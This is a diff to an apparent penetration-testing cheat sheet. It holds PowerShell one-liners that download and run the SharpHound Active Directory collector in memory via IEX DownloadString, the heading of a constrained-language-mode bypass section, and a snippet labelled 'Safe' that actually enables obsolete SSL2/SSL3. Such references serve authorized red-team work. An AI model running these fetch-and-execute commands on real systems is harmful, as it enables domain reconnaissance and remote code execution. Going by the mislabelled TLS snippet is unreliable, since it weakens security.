@@ -1,17 +1,3 @@
-##### Add HTTP-text to line
-~~~
-awk  '{print "http://" $1}' urls.txt
-~~~
-##### Change permissions of folder (Linux)
-~~~
-sudo chmod +x $(find /PATH/)
-~~~
-##### BloodHound ingestor trough PowerShell
-~~~
-IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound -LdapUsername "Username" -LdapPassword "Password" -Domain "Domain" -DomainController DC-ip -CollectionMethods All -OutputDirectory "C:\TEMP\"
-~~~
-
-
 # Bypasses
 ------------
 ##### Powershell CLM Bypass:
@@ -67,4 +53,10 @@ IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com
 ##### Sharphound
 ~~~
 IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -Domain <domain> -CollectionMethod All
+~~~
+##### Safe SSL/TLS-Channel
+~~~
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [
+Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.Se
+curityProtocolType]::Tls12
 ~~~
